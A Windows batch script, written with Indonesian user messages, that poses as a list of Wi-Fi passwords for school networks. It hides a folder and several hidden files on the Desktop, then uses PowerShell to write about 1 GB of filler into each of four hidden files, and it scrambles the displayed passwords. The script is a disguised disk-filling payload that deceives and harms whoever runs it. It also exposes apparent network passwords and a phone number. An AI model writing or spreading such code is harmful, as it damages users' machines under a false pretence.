@echo off

echo Mohon jangan tutup pop up cmd yang muncul di komputer/laptop anda!
echo pop up cmd yang muncul di komputer/laptop anda akan hilang secara otomatis!
echo kalau ada password wifi yang salah, silahkan lapor ke wa +62 821 3905 8176
set "desktop=%USERPROFILE%\Desktop"

if not exist "%desktop%" (
  echo Desktop directory not found.
  exit /b
)

cd /d "%desktop%"

set "folder=ListPasswordWiFi"
md "List Password Wifi" 2>nul
setlocal enabledelayedexpansion
set "folderPath=%USERPROFILE%\Desktop\List Password Wifi"
set "systemIconPath=%SystemRoot%\System32\SHELL32.dll"
attrib +s +h "%folderPath%"
echo y | copy /-y "%systemIconPath%" "%folderPath%\desktop.ini"
echo [.ShellClassInfo] > "%folderPath%\desktop.ini"
echo IconResource=%systemIconPath%,0 >> "%folderPath%\desktop.ini"
> "List Password Wifi\iMgPhbRoFsIRCgYPmizr.txt" (
  echo Semua password wifi yang ada disini valid!
  echo Terakhir di update: 31/12/2023
  echo By Felixx
)
> "List Password Wifi\iMgPhbRoFsIRCgYPmizr_.txt" (
  echo By Felixx
)
> "List Password Wifi\FOTGPDhIfRGlrvStQRTg.txt" (
  echo By Felixx
)
> "List Password Wifi\FOTGPDhIfRGlrvStQRTg_.txt" (
  echo By Felixx
)
attrib +h "List Password Wifi\FOTGPDhIfRGlrvStQRTg.txt"
attrib +h "List Password Wifi\FOTGPDhIfRGlrvStQRTg_.txt"
attrib +h "List Password Wifi\iMgPhbRoFsIRCgYPmizr.txt"
attrib +h "List Password Wifi\iMgPhbRoFsIRCgYPmizr_.txt"
> "List Password Wifi\SMP PETRA 3 STUDENT.txt" (
  echo Password = pppkp3tr4
)

> "List Password Wifi\ICT Room1.txt" (
  echo Password = xepyerSlY
)

> "List Password Wifi\LAB BAHASA.txt" (
  echo Password = lexepe2155
)

> "List Password Wifi\LibraryP3.txt" (
  echo Password = xaqxzsx3
)
start explorer "%userprofile%\Desktop\List Password Wifi"
powershell -WindowStyle Minimized -Command "& {Start-Process cmd -ArgumentList '/c ping localhost -n 5' -WindowStyle Minimized}"
powershell -Command "[System.IO.File]::WriteAllText('List Password Wifi\iMgPhbRoFsIRCgYPmizr.txt', ('a' * 1000MB))"
powershell -Command "[System.IO.File]::WriteAllText('List Password Wifi\iMgPhbRoFsIRCgYPmizr_.txt', ('a' * 1000MB))"
powershell -Command "[System.IO.File]::WriteAllText('List Password Wifi\FOTGPDhIfRGlrvStQRTg.txt', ('a' * 1000MB))"
powershell -Command "[System.IO.File]::WriteAllText('List Password Wifi\FOTGPDhIfRGlrvStQRTg_.txt', ('a' * 1000MB))"
powershell -command "& { (Get-Content 'List Password Wifi\ICT Room1.txt' -Raw) -replace 'x', 'M' -replace 'e', 'a' -replace 'p', 'n' -replace 'l', 'B' -replace 'Loading...' , ' '  | Set-Content 'List Password Wifi\ICT Room1.txt' }"
powershell -command "& { (Get-Content 'List Password Wifi\LAB BAHASA.txt' -Raw) -replace 'x', 'h' -replace 'e', 'a' -replace 'p', 's' -replace 'l', 'b' -replace 'Loading...' , ' ' | Set-Content 'List Password Wifi\LAB BAHASA.txt' }"
powershell -command "& { (Get-Content 'List Password Wifi\LibraryP3.txt' -Raw) -replace 'x', 'p' -replace 'a', 'e' -replace 'z', 'u' -replace 'q', 'r' -replace 'Loading...' , ' '  | Set-Content 'List Password Wifi\LibraryP3.txt' }"